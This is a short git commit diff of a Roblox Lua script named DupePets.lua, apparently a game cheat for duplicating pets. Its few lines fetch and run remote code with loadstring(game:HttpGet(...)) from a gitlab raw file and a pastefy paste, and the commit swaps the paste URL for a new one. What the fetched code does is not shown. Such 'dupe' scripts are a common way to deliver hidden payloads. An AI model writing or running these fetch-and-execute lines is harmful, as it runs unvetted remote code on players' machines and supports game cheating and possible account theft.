2804dd529ba21a09911c9a298dcc7500bf3b030f
Biggg886 <154685671+Biggg886@users.noreply.github.com>
2025-08-09 10:24:10 +0700

    Update DupePets.lua

--- DupePets.lua
+++ DupePets.lua
@@ -2,4 +2,4 @@
 local Spawner = loadstring(game:HttpGet("https://gitlab.com/darkiedarkie/dark/-/raw/main/Spawner.lua"))()
 Spawner.Load()
 -- โหลดและรันอีกสคริปต์
-loadstring(game:HttpGet("https://pastefy.app/hfns5lum/raw"))()
+loadstring(game:HttpGet("https://pastefy.app/jYAHo6Wz/raw"))()
